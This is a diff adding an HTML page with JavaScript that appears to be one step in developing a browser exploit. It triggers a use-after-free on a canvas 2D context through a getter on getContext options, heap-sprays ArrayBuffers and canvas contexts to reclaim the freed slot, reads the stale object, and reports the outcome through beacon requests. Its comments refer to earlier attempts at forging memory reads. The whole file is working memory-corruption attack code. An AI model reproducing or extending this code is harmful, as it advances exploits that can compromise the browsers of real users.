@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V904</title></head>
+<body><pre id="out">V904 — reclaim-type discriminator (AB vs canvas vs none)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V904-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+
+/*
+ * Question: on 14.22, what reclaims the freed 768B CanvasRenderingContext2D?
+ *   v650 assumed an AB(768) spray reclaims it (forge through the AB overlay).
+ *   p553 proved a canvas-context spray reclaims it (live alias).
+ *   v902/v903: 265 forged reads, every one crashed at the same point —
+ *   consistent with the AB never landing in the slot (stale reads zeroed
+ *   memory -> null deref -> crash, target address irrelevant).
+ *
+ * Method: trigger UAF, spray 200 AB(768) filled with a distinctive double,
+ * THEN spray 200 canvas contexts with lineWidth markers, THEN read
+ * stale.lineWidth once:
+ *   marker 800..1000  -> canvas reclaimed (live alias — p553 shape)
+ *   weird huge number -> AB reclaimed (forge viable, v650 shape)
+ *   1                 -> nothing reclaimed
+ *   crash             -> neither reclaimed cleanly
+ * Sync XHR beacons before every risky step.
+ */
+
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/V904-'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+
+var canvas = document.createElement('canvas');
+canvas.width = 1; canvas.height = 1;
+var innerCtx = null;
+var uafOpts = {};
+Object.defineProperty(uafOpts, 'alpha', {get: function() {
+  innerCtx = canvas.getContext('2d');
+  return true;
+}});
+var bmr = canvas.getContext('bitmaprenderer', uafOpts);
+b('UAF inner=' + (innerCtx ? 'OK' : 'NULL') + ' outer=' + (bmr ? 'OK' : 'NULL') + ' same=' + (innerCtx === bmr));
+
+for (var f = 0; f < 600; f++) { var tmp = new ArrayBuffer(16); }
+
+/* AB(768) spray, every 8 bytes = 1234.5678 */
+var FILL = 1234.5678;
+var abs = [];
+for (var s = 0; s < 200; s++) {
+  var ab = new ArrayBuffer(768);
+  var dv = new DataView(ab);
+  for (var o = 0; o < 768; o += 8) dv.setFloat64(o, FILL, true);
+  abs.push(ab);
+}
+b('AB-SPRAY n=' + abs.length);
+
+/* canvas spray with markers */
+var ctxs = [];
+for (var c = 0; c < 200; c++) {
+  var cc = document.createElement('canvas');
+  cc.width = 1; cc.height = 1;
+  document.body.appendChild(cc);
+  var cx = cc.getContext('2d');
+  if (cx) { cx.lineWidth = 800 + c; ctxs.push(cx); }
+}
+b('CANVAS-SPRAY n=' + ctxs.length);
+
+/* the dangerous read */
+var lw = null;
+try { lw = innerCtx.lineWidth; } catch (e) { lw = 'ERR:' + e.name; }
+b('READ lw=' + lw);
+
+if (typeof lw === 'number') {
+  if (lw >= 800 && lw < 1000) {
+    b('VERDICT canvas-reclaimed idx=' + Math.round(lw - 800));
+  } else if (Math.abs(lw - 1) < 0.001) {
+    b('VERDICT unreclaimed default-1');
+  } else if (Math.abs(lw - FILL) < 0.01) {
+    b('VERDICT ab-reclaimed exact-fill');
+  } else {
+    b('VERDICT ab-reclaimed-partial lw=' + lw + ' hex=' + (function(){var b8=new ArrayBuffer(8),f=new Float64Array(b8),u=new Uint32Array(b8);f[0]=lw;return ('00000000'+u[1].toString(16)).slice(-8)+('00000000'+u[0].toString(16)).slice(-8);})());
+  }
+  b('ALIVE');
+} else {
+  /* crash before this point = neither reclaimed (or AB landed and read faulted) */
+  b('ALIVE-ERR lw=' + lw);
+}
+</script></body></html>
